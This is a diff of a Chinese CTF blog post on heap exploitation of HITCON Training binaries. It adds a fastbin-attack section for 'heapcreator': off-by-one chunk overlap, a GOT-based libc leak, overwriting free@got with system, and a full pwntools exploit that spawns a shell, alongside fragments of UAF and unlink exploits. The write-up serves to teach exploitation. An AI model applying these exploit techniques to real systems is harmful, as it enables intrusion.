@@ -5,7 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="堆学习记录, L">
-    <meta name="description" content="大部分题目都选自HITCON Training#UAF漏洞(use after free)顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时">
+    <meta name="description" content="大部分题目都选自HITCON Training
+UAF漏洞(use after free)顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -402,14 +403,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.4k
+                    3.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    15 分
                 </div>
                 
 
@@ -425,8 +426,10 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>大部分题目都选自HITCON Training<br>#UAF漏洞(use after free)<br>顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时候依然能狗使用该堆块</p>
-<p>看到题目<br>##hacknote<br>先checksec走一波<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32位文件，只开了nx和canary，partial RELRO意味着got表可改<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>增删查功能<br>接着IDA分析<br>先看到add功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>首先malloc一个8字节(实际上是分配了16字节，chunk头两个4字节，加上分配的八字节一共16个字节)<br>这16个字节的地址存在notelist这个数组中<br>接着，在这16个字节处，前八个字节是chunk头，接下来的8个字节存入<code>print_note_content</code>函数指针，这个函数的功能是打印<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>后八个字节存入我们申请的size大小的内存的地址</p>
+                <p>大部分题目都选自HITCON Training</p>
+<h1 id="UAF漏洞-use-after-free"><a href="#UAF漏洞-use-after-free" class="headerlink" title="UAF漏洞(use after free)"></a>UAF漏洞(use after free)</h1><p>顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时候依然能狗使用该堆块</p>
+<p>看到题目</p>
+<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>先checksec走一波<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32位文件，只开了nx和canary，partial RELRO意味着got表可改<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>增删查功能<br>接着IDA分析<br>先看到add功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>首先malloc一个8字节(实际上是分配了16字节，chunk头两个4字节，加上分配的八字节一共16个字节)<br>这16个字节的地址存在notelist这个数组中<br>接着，在这16个字节处，前八个字节是chunk头，接下来的8个字节存入<code>print_note_content</code>函数指针，这个函数的功能是打印<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>后八个字节存入我们申请的size大小的内存的地址</p>
 <pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content
 v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
 v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
@@ -521,7 +524,7 @@ add<span class="token punctuation">(</span><span class="token number">8</span><s
 gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
 show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>#Unlink<br>##bamboobox<br>就不细说unlink的原理了，网上有很多师傅的博客可以看，直接说利用方法<br>伪造一个fakechunk0，使fakechunk0的fd指针为<code>&amp;ptr-0x18</code>,使其bk为<code>&amp;ptr-0x10</code>,并通过堆溢出使相邻的下一个堆chunk1认为上一个堆是空闲状态。构造好之后，再free掉chunk1，根据unlink原理，fakechunk也会一起被free掉，攻击效果是ptr最终指向了<code>&amp;ptr-0x18</code>处</p>
+<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h2><p>就不细说unlink的原理了，网上有很多师傅的博客可以看，直接说利用方法<br>伪造一个fakechunk0，使fakechunk0的fd指针为<code>&amp;ptr-0x18</code>,使其bk为<code>&amp;ptr-0x10</code>,并通过堆溢出使相邻的下一个堆chunk1认为上一个堆是空闲状态。构造好之后，再free掉chunk1，根据unlink原理，fakechunk也会一起被free掉，攻击效果是ptr最终指向了<code>&amp;ptr-0x18</code>处</p>
 <p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/11.jpg" alt=""><br>64位，只开启了canary和nx，我们可以复写got表<br>运行一下，查看功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/12.jpg" alt=""><br>增删查改，功能齐了<br>IDA分析 </p>
 <pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span>
 <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
@@ -599,7 +602,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
     <span class="token keyword">int</span> size <span class="token punctuation">;</span>
     <span class="token keyword">char</span> <span class="token operator">*</span>name <span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
-<p>为了防止以后遗忘仔细记录一次<br>i是4个字节</p>
+<p>为了防止以后遗忘仔细记录一次<br>int是4个字节</p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre>
 <p>这一句判断判断的是item结构体中name指针是否存在，那么name指针的位置又是怎么确定的，结合题目说明一下</p>
 <pre class=" language-bash"><code class="language-bash">0x6020c0 <span class="token operator">&lt;</span>itemlist<span class="token operator">></span>:    0x0000000000000018  0x0000000000603030
@@ -791,6 +794,117 @@ io<span class="token punctuation">.</span>recvuntil<span class="token punctuatio
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><p>fastbin attack是利用fastbin分配原理的漏洞，要求有堆溢出漏洞，通常情况下与double free、use after free和chunk extend连用<br>详细的讲解可以看看<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">breezeO_o</a>师傅的文章，讲的很详细，我这里就记录一下我做的两道题</p>
+<h2 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h2><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/19.jpg" alt=""><br>64位文件，可以复写got表<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/20.jpg" alt=""><br>增删查改，没毛病<br>IDA分析<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/21.jpg" alt=""><br>main函数利用switch选择功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/22.jpg" alt=""><br>分析create功能<br>最大能创建十次<br>然后会先malloc一个0x10(实际为0x20)大小的chunk(称之为heap)，其指针存入heaparray数组中<br>接下来分配用户指定大小的chunk(content)，其size存入heap数据段的第一个八字节中(即fd位)，content的指针存入heap的第二个八字节当中(即bk位)<br>heap结构如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> heap <span class="token punctuation">{</span>
+    size_t size <span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/23.jpg" alt=""><br>分析edit功能<br>根据index寻找chunk<br>如果存在则可以编辑<br>但读入content的时候存在off-by-one漏洞，如图所示<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/24.jpg" alt=""><br>这导致我们可以修改下一个chunk的size位<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/25.jpg" alt=""><br>分析show功能<br>同样根据index寻找chunk，如果对应的heaparray存在则输出size和content<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/26.jpg" alt=""><br>最后分析delete功能<br>delete功能没有什么问题，free的同时将指针置0</p>
+<p>根据上面的分析，程序存在的漏洞存在于edit<br>先锋装一下函数</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>思考一下如何getshell，程序只开启了Partial RELRO，那么可以将free@got修改成system@got，再够造出一个内容为/bin/sh的chunk，将其free即可<br>那么我们先创建2个chunk(实际上一共创建了4个)</p>
+<pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span></code></pre>
+<p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/27.jpg" alt=""><br>我们将第一个content赋值为/bin/sh，并且通过溢出将下面两个chunk合并为一个</p>
+<pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/28.jpg" alt=""><br>可以看到我们成功的将heap[1]的大小修改成了heap[1]+content[1]<br>我们delete掉heap[1]，就将content一起free掉了，fastbin中就存在了一个0x20大小和0x40大小的chunk。之后我们再申请一个大小为0x30(实际为0x40)的chunk，首先会malloc一个0x20大小的chunk作为heap，这样原本作为old content[1]的chunk就被分配给了new heap[1],而分配给new content[1]的0x40大小的chunk则包含了old heap[1]+old content[1],也就是说，我们可以通过控制new content[1]来修改new heap[1]d的值。<br>于是我们将new heap[1]指向new content[1]的指针改为free@got，这样，当我们输出new content[1]时，就会去输出free在内存中的地址，从而泄露libc基地址</p>
+<pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>
+
+free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> 
+<span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span></code></pre>
+<p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/29.jpg" alt=""></p>
+<p>最后我们将free@got修改为system@got，再free掉content[0]即可getshell</p>
+<pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>完整exp如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",27942)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'heapcreator'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(io)</span>
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>
+
+free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> 
+<span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -957,7 +1071,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            大部分题目都选自HITCON Training#UAF漏洞(use after free)顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时
+                            大部分题目都选自HITCON Training
+UAF漏洞(use after free)顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时
                         
                     </div>
                     <div class="publish-info">
@@ -1192,7 +1307,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.6k</span>&nbsp;字
+                class="white-color">16.5k</span>&nbsp;字
             
             
             
